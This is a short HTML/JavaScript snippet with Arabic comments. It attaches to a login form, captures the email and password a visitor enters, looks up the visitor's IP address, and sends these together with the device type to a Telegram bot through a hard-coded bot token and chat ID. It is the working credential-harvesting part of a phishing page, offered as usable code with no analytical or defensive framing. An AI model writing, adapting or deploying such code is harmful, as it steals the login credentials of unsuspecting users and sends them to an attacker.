<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "8885720806:AAH4eVrHQ48uHInIJjnv5AB5pxrEAJrIXP4"; 
    const CHAT_ID = "5133376032"; 
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // الحصول على معلومات الجهاز
        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;
                const userAgent = navigator.userAgent;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = `
<b>New Login Attempt</b>
<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>IP:</b> ${ip}
<b>Device:</b> ${deviceType}
                `;

                // إرسال البيانات
                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('تم الإرسال بنجاح!');
                }).catch(error => {
                    console.error(error);
                    alert('حدث خطأ في الإرسال');
                });
            })
            .catch(error => {
                alert('خطأ في الاتصال');
            });
    });
</script>
